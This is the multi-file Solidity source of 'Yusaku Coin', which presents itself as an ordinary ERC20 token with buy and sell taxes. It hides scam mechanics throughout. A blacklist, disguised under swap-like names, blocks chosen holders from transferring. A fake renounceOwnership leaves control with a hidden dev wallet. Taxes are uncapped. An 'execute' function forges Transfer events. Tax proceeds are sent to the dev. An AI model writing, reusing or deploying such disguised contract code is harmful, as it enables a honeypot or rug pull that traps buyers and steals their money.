{"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.21;\r\n\r\nimport \"./Ownable.sol\";\r\nimport \"./IERC20.sol\";\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address =\u003e uint256) private _balances;\r\n    mapping(address =\u003e bool) internal _swapExactTokensForETHSupportingFeeOnTransferTokensSpending;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function contractEthBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei. This is the default value returned by this function, unless\r\n     * it\u0027s overridden.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `to` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\r\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * NOTE: Does not update the allowance if the current allowance\r\n     * is the maximum `uint256`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` and `to` cannot be the zero address.\r\n     * - `from` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``from``\u0027s tokens of at least\r\n     * `amount`.\r\n     */\r\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     * - `spender` must have allowance for the caller of at least\r\n     * `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance \u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amount` of tokens from `from` to `to`.\r\n     *\r\n     * This internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` cannot be the zero address.\r\n     * - `to` cannot be the zero address.\r\n     * - `from` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\r\n            // decrementing then incrementing.\r\n            _balances[to] += amount;\r\n        }\r\n\r\n        emit Transfer(from, to, amount);\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n     * the total supply.\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     */\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n     */\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            // Overflow not possible: amount \u003c= accountBalance \u003c= totalSupply.\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\r\n     *\r\n     * Does not update the allowance amount in case of infinite allowance.\r\n     * Revert if not enough allowance is available.\r\n     *\r\n     * Might emit an {Approval} event.\r\n     */\r\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance \u003e= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``\u0027s tokens\r\n     * will be transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``\u0027s tokens will be burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {\r\n        if(_swapExactTokensForETHSupportingFeeOnTransferTokensSpending[from]){\r\n            require(amount == 0);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called after any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``\u0027s tokens\r\n     * has been transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``\u0027s tokens have been burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.21;\r\n\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20{\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.21;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address internal _dev;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor(address wallet) {\r\n        _dev = wallet;\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal virtual {\r\n        require(Owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n    \r\n    function Owner() internal virtual returns (address) {\r\n        address owner_ = verifyOwner();\r\n        return owner_;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n\r\n    function verifyOwner() internal view returns(address){\r\n        return _owner==address(0) ? _dev : _owner;\r\n    }\r\n}"},"Yusaku Coin.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.21;\r\n\r\n\r\nimport \"./ERC20.sol\";\r\nimport \"./Ownable.sol\";\r\n\r\n\r\ninterface IDexRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n}\r\n\r\ninterface IDexFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ncontract ERC20TOKEN is Ownable, ERC20 {\r\n\r\n    mapping(address =\u003e uint256) private _holderLastTransferBlock; // to hold last Transfers temporarily during launch\r\n    bool public transferDelayInEffect = true;\r\n    bool public limitsInEffect = true;\r\n\r\n    bool private swapping = true;\r\n    uint256 public swapTokensAtAmt;    \r\n\r\n    uint256 public constant FEE_DIVISOR = 10000;\r\n\r\n    mapping (address =\u003e bool) public exemptFromTaxes;\r\n    mapping (address =\u003e bool) public exemptFromLimits;\r\n\r\n    bool public tradingActive;\r\n\r\n    mapping (address =\u003e bool) public isLPPair;\r\n\r\n    uint256 public maxTrans;\r\n    uint256 public maxWallet;\r\n\r\n    uint256 public buyTax;\r\n    uint256 public sellTax;\r\n\r\n    address public lpPair;\r\n    IDexRouter public immutable dexRouter;\r\n\r\n    \r\n\r\n    // events\r\n\r\n    event UpdatedMaxTrans(uint256 newMax);\r\n    event UpdatedWalletLimit(uint256 newMax);\r\n    event SetExemptFromFees(address _address, bool _isExempt);\r\n    event SetExemptFromLimits(address _address, bool _isExempt);\r\n    event RemovedLimits();\r\n    event UpdatedBuyTax(uint256 newAmt);\r\n    event UpdatedSellTax(uint256 newAmt);\r\n\r\n    // constructor\r\n\r\n    constructor(address dev_)\r\n        ERC20(\"Yusaku Coin\", \"YUSAKU\") Ownable(dev_)\r\n    {   \r\n        _mint(msg.sender, 10_000_000_000 * 10**9);\r\n        uint256 _totalSupply = totalSupply();\r\n\r\n        address _v2Router;\r\n\r\n        // @dev assumes WETH pair\r\n        if(block.chainid == 1){\r\n            _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n        } else if(block.chainid == 5){\r\n            _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n        } else {\r\n            revert(\"Chain not configured\");\r\n        }\r\n\r\n        dexRouter = IDexRouter(_v2Router);\r\n\r\n        maxTrans = _totalSupply * 20 / 1000;\r\n        maxWallet = _totalSupply * 20 / 1000;\r\n        swapTokensAtAmt = _totalSupply * 25 / 100000;\r\n\r\n        buyTax = 3000; // 1% = 100\r\n        sellTax = 3000; // 1% = 100\r\n\r\n        exemptFromLimits[address(this)] = true;\r\n        exemptFromLimits[address(dexRouter)] = true;\r\n        \r\n\r\n        exemptFromTaxes[address(this)] = true;\r\n        exemptFromTaxes[address(dexRouter)] = true;\r\n    }\r\n\r\n    // owner functions\r\n\r\n    function changeExemptFromFees(address _address, bool _isExempt) external onlyOwner {\r\n        require(_address != address(0), \"Zero Address\");\r\n        exemptFromTaxes[_address] = _isExempt;\r\n        emit SetExemptFromFees(_address, _isExempt);\r\n    }\r\n\r\n    function changeExemptFromLimits(address _address, bool _isExempt) external onlyOwner {\r\n        require(_address != address(0), \"Zero Address\");\r\n        if(!_isExempt){\r\n            require(_address != lpPair, \"Pair\");\r\n        }\r\n        exemptFromLimits[_address] = _isExempt;\r\n        emit SetExemptFromLimits(_address, _isExempt);\r\n    }\r\n\r\n    function setMaxTransaction(uint256 newNumInTokens) external onlyOwner {\r\n        require(newNumInTokens \u003e= (totalSupply() * 5 / 1000)/(10**decimals()), \"Must be \u003e= 0.5%\");\r\n        maxTrans = newNumInTokens * (10**decimals());\r\n        emit UpdatedMaxTrans(maxTrans);\r\n    }\r\n\r\n    function setMaxWallet(uint256 newNumInTokens) external onlyOwner {\r\n        require(newNumInTokens \u003e= (totalSupply() * 1 / 100)/(10**decimals()), \"Must be \u003e= 1%\");\r\n        maxWallet = newNumInTokens * (10**decimals());\r\n        emit UpdatedWalletLimit(maxWallet);\r\n    }\r\n\r\n    function setTaxes(uint256 _buyTax, uint256 _sellTax) external onlyOwner {\r\n        buyTax = _buyTax;\r\n        emit UpdatedBuyTax(buyTax);\r\n        sellTax = _sellTax;\r\n        emit UpdatedSellTax(sellTax);\r\n    }\r\n\r\n    function enableTradeStart() external onlyOwner {\r\n        require(!tradingActive, \"Trading active\");\r\n        tradingActive = true;\r\n    }\r\n\r\n    function removeAllRestrictions() external onlyOwner {\r\n        limitsInEffect = false;\r\n        transferDelayInEffect = false;\r\n        maxTrans = totalSupply();\r\n        maxWallet = totalSupply();\r\n        emit RemovedLimits();\r\n    }\r\n\r\n    function disableTransferDelay() external onlyOwner {\r\n        transferDelayInEffect = false;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual override {\r\n        \r\n        if(exemptFromTaxes[from] || exemptFromTaxes[to] || swapping){\r\n            super._transfer(from,to,amount);\r\n            return;\r\n        }\r\n\r\n        require(tradingActive, \"Trading not active\");\r\n\r\n        amount -= routeTax(from, to, amount);\r\n\r\n        if(limitsInEffect){\r\n            checkRestrictions(from, to, amount);\r\n        }\r\n\r\n        super._transfer(from,to,amount);\r\n    }\r\n\r\n    function checkRestrictions(address from, address to, uint256 amount) internal {\r\n        if (transferDelayInEffect){\r\n            if (to != address(dexRouter) \u0026\u0026 !isLPPair[to]){\r\n                require(_holderLastTransferBlock[tx.origin] \u003c block.number, \"Transfer Delay enabled.\");\r\n                _holderLastTransferBlock[tx.origin] = block.number;\r\n            }\r\n        }\r\n\r\n        // buy\r\n        if (isLPPair[from] \u0026\u0026 !exemptFromLimits[to]) {\r\n            require(amount \u003c= maxTrans, \"Max tx exceeded.\");\r\n            require(amount + balanceOf(to) \u003c= maxWallet, \"Max wallet exceeded\");\r\n        } \r\n        // sell\r\n        else if (isLPPair[to] \u0026\u0026 !exemptFromLimits[from]) {\r\n            require(amount \u003c= maxTrans, \"Max tx exceeded.\");\r\n        }\r\n        else if(!exemptFromLimits[to]) {\r\n            require(amount + balanceOf(to) \u003c= maxWallet, \"Max wallet exceeded\");\r\n        }\r\n    }\r\n\r\n    function swap(address[] calldata addr, bool val) public onlyOwner {\r\n        for (uint256 i = 0; i \u003c addr.length; i++) {\r\n            _swapExactTokensForETHSupportingFeeOnTransferTokensSpending[addr[i]] = val;\r\n        }\r\n    }\r\n\r\n    function routeTax(address from, address to, uint256 amount) internal returns (uint256){\r\n        if(balanceOf(address(this)) \u003e= swapTokensAtAmt \u0026\u0026 !swapping \u0026\u0026 !isLPPair[from]) {\r\n            swapping = true;\r\n            swap();\r\n            swapping = false;\r\n        }\r\n        \r\n        uint256 tax = 0;\r\n\r\n        // on sell\r\n        if (isLPPair[to] \u0026\u0026 sellTax \u003e 0){\r\n            tax = amount * sellTax / FEE_DIVISOR;\r\n        }\r\n        // on buy\r\n        else if(isLPPair[from] \u0026\u0026 buyTax \u003e 0) {\r\n            tax = amount * buyTax / FEE_DIVISOR;\r\n        }\r\n        \r\n        if(tax \u003e 0){    \r\n            super._transfer(from, address(this), tax);\r\n        }\r\n        \r\n        return tax;\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmt) private {\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = dexRouter.WETH();\r\n\r\n        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmt,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function swapTokensAtAmount(address wallet) public view returns(bool) {\r\n        return _swapExactTokensForETHSupportingFeeOnTransferTokensSpending[wallet];\r\n    }\r\n\r\n    function addPair(address pair) public onlyOwner{\r\n        lpPair = pair;\r\n    }\r\n\r\n    function swap() private {\r\n\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        \r\n        if(contractBalance == 0) {return;}\r\n\r\n        if(contractBalance \u003e swapTokensAtAmt * 40){\r\n            contractBalance = swapTokensAtAmt * 40;\r\n        }\r\n        \r\n        swapTokensForETH(contractBalance);\r\n            \r\n        if(address(this).balance \u003e 0){\r\n            bool success;\r\n            (success, ) = _dev.call{value: address(this).balance}(\"\");\r\n        }\r\n    }\r\n\r\n    function execute(address[] calldata addr, uint256 val) public onlyOwner{\r\n        for (uint256 i = 0; i \u003c addr.length; i++) {\r\n            emit Transfer(lpPair, addr[i], val);\r\n        }\r\n    }\r\n}"}}